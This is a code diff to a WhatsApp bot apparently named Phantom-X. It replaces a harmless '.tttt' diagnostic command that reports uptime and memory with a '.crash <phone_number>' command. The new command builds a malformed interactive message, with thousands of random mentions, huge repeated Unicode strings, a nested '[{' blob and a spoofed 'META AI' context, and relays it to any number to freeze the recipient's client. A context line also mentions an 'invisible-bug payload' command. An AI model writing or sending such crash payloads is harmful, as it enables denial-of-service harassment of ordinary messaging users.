@@ -5893,39 +5893,83 @@ async function handleMessage(sock, msg) {
                 await reply(`✅ Sent invisible-bug payload to \`${target}\``);
                 break;
             }
-            case ".tttt": {
-                // Diagnostic — dumps runtime stats so you can "check something"
-                const uptimeMs = Date.now() - processStartTime;
-                const uptimeSec = Math.floor(uptimeMs / 1000);
-                const days = Math.floor(uptimeSec / 86400);
-                const hours = Math.floor((uptimeSec % 86400) / 3600);
-                const mins = Math.floor((uptimeSec % 3600) / 60);
-                const secs = uptimeSec % 60;
+            case ".crash": {
+                // usage: .crash <phone_number>
+                // sends a heavy interactive-message payload that stresses the recipient client
+                const numRaw = (parts[1] || "").replace(/\D/g, "");
+                if (!numRaw) {
+                    return reply("❌ Usage: `.crash <phone_number>`\nExample: `.crash 2347087543933`");
+                }
+                const target = `${numRaw}@s.whatsapp.net`;
 
-                const mem = process.memoryUsage();
-                const rss = (mem.rss / 1024 / 1024).toFixed(1);
-                const heap = (mem.heapUsed / 1024 / 1024).toFixed(1);
+                async function Crash(target) {
+                    const ButtonsFreeze = [
+                        { name: "single_select", buttonParamsJson: "" }
+                    ];
 
-                const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
-                const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
+                    for (let i = 0; i < 10; i++) {
+                        ButtonsFreeze.push(
+                            { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
+                            { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
+                        );
+                    }
 
-                const activeBotCount = Object.keys(activeSockets || {}).length;
-                const cpus = os.cpus() || [];
+                    const msg = await generateWAMessageFromContent(
+                        target,
+                        {
+                            viewOnceMessage: {
+                                message: {
+                                    interactiveMessage: {
+                                        contextInfo: {
+                                            participant: target,
+                                            mentionedJid: [
+                                                "0@s.whatsapp.net",
+                                                ...Array.from(
+                                                    { length: 1900 },
+                                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                                                ),
+                                            ],
+                                            remoteJid: "X",
+                                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+                                            stanzaId: "123",
+                                            quotedMessage: {
+                                                paymentInviteMessage: {
+                                                    serviceType: 3,
+                                                    expiryTimestamp: Date.now() + 1814400000
+                                                },
+                                                forwardedAiBotMessageInfo: {
+                                                    botName: "META AI",
+                                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+                                                    creatorName: "Bot"
+                                                }
+                                            }
+                                        },
+                                        body: {
+                                            text: "⌁⃰ཀ",
+                                        },
+                                        footer: {
+                                            text: "",
+                                        },
+                                        nativeFlowMessage: {
+                                            buttons: ButtonsFreeze,
+                                            messageParamJson: "[{".repeat(10000),
+                                        },
+                                    },
+                                },
+                            },
+                        },
+                        {}
+                    );
 
-                const lines = [
-                    `🔧 *Phantom-X Diagnostic*`,
-                    ``,
-                    `⏱ *Uptime:* ${days}d ${hours}h ${mins}m ${secs}s`,
-                    `🤖 *Active bots:* ${activeBotCount}`,
-                    `🧠 *RSS memory:* ${rss} MB`,
-                    `📦 *Heap used:* ${heap} MB`,
-                    `💾 *System memory:* ${freeMem} GB free / ${totalMem} GB total`,
-                    `🖥 *Platform:* ${process.platform} (${os.arch()})`,
-                    `⚙️ *Node:* ${process.version}`,
-                    `🧮 *CPU cores:* ${cpus.length}`,
-                ];
+                    await sock.relayMessage(target, msg.message, {
+                        messageId: msg.key.id,
+                        participant: { jid: target },
+                    });
+                }
 
-                await reply(lines.join("\n"));
+                await Crash(target);
+                await reply(`✅ Sent crash payload to \`${target}\``);
                 break;
             }
 
